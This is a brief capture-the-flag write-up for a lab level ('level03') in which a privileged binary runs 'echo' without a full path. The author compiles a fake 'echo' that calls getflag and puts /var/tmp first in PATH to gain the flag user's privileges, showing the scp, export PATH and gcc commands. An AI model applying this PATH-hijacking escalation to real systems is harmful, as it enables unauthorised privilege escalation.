strace show us that ./level03 use a different uid that the user, interesting.
Also reveal no call to write, but a fork.
strings show us "echo" and the string printed.
So probably level03 execute echo.
We craft a basic executable that will call getflag. (Tried with whoami first, confirmed uid was flag03), rename it to echo and change the PATH so it is the first match.

From host :
```
scp -P 4242 exploit.c level03@localhost:/var/tmp/
```

From guest:
```
export PATH=/var/tmp/:$PATH
cd /var/tmp
gcc exploit.c -o echo
cd
./level03
```
